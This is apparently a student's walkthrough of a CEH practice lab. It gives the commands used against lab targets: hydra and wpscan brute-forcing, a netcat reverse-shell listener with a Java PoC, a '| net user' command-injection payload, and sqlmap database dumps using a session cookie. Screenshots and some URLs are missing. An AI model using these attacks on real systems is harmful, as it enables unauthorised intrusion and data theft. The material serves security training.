---
title: ceh-engage-part-3
tags: [ceh, engage, type/walkthrough, phase/exploitation, platform/web]
---

# CEH Engage Part 3

You have been assigned a task to perform a clickjacking test on www.certifiedhacker.com that the CEHORG members widely use. Find out whether the site is vulnerable to clickjacking.

### GhostEye

          (67) 

          (68) 

### Nikto

          (141) 

Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server.

### BillCipher

          (69) 

### Whatweb

          (143) 

An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file.

```
nmap -p 21 172.16.0.0/24

nmap -p 21 10.10.10.0/24

nmap -p 21 192.168.0.0/24
```

```
hydra -L <username.txt> -P <password.txt> ftp://172.16.0.12
```

          (144) 

          (202) 

          (203) 

Perform web application reconnaissance on movies.cehorg.com and find out the HTTP server used by the web application.

### Whatweb

```
whatweb movies.cehorg.com
```

          (70) 

### Nmap

          (145) 

          (101) 

Identify the load balancing service used by eccouncil.org.&#x20;

```
ldb eccouncil.org
```

\-> cloudflare

          (146) 

Identify the Content Management System used by www.cehorg.com.

```
wig www.cehorg.com
```

          (147) 

Perform a bruteforce attack on www.cehorg.com and find the password of user adam.

```
wpscan --url  -U <username.txt> -P <password.txt>
```

          (78) 

          (77) 

Perform parameter tampering on movies.cehorg.com and find out the user for id 1003.

          (75) 

  
Type the username as "Jason" and password as "welcome"

\
We found this username and password in the engage part 2. While dumping the wireshark capture data. REMEMBER?
   

          (76) 

You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer.

```
nmap -p 8080 172.16.0.0/24

nmap -p 8080 10.10.10.0/24

nmap -p 8080 192.168.0.0/24
```

#### Extract and Setup Jdk

```
tar -xf jdk-8u202-linux-x64.tar.gz

mv jdk1.8.0_202 /usr/bin
```

#### Update the JDK Path in the Poc.py file

  
Change Line no: 62, replace jdk1.8.0\_20/bin/javac with "/usr/bin/jdk1.8.0\_202/bin/javac"

\
Change Line no: 87, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"\
\
Change Line no: 99, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"
   

#### Create a Netcat Listener

```
nc -lvp 9001
```

#### Create a Payload

```
python3 poc.py --userip 10.10.1.13 --webport 8080 --lport 9001
```

  
Copy the send me payload and paste in the username field and enter any random password and press Login
   

          (102) 

          (103) 

          (104) 

          (105) 

Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine. Note: Exclude admin/Guest user

```
| net user
```

          (112) 

A file named Hash.txt has been uploaded through DVWA ( The file is located in the directory mentioned below. Access the file and crack the MD5 hash to reveal the original message; enter the content after cracking the hash. You can log into the DVWA using the following credentials. Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt Hint: Use “type” command to view the file. Use the following link to decrypt the hash- 

          (110) 

          (111) 

Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine.

          (113) 

Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder.

          (114) 

Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. (Yes/No).

\-> No

### PwnXSS

```
python3 pwnxss.py -u 
```

### OWASP ZAP

          (115) 

Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials.

#### Get Database

```
sqlmap -u " --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" --dbs
```

#### Get Tables

```
sqlmap -u " --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope --tables
```

#### Get number of Users available

```
sqlmap -u " --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope -T UserProfile --count
```

#### Dump Table Data

```
sqlmap -u " --cookie="<Cookie Value>" -D moviescope -T User_Login --dump
```

#### Dump Databases

```
sqlmap -u " --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope --dump-all
```

    ../../.gitbook/assets/Screenshot from 2023-11-25 15-57-59 

    ../../.gitbook/assets/Screenshot from 2023-11-25 15-59-02 

    ../../.gitbook/assets/Screenshot from 2023-11-25 15-58-22 

CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network.

    ../../.gitbook/assets/Screenshot from 2023-11-25 16-02-44 
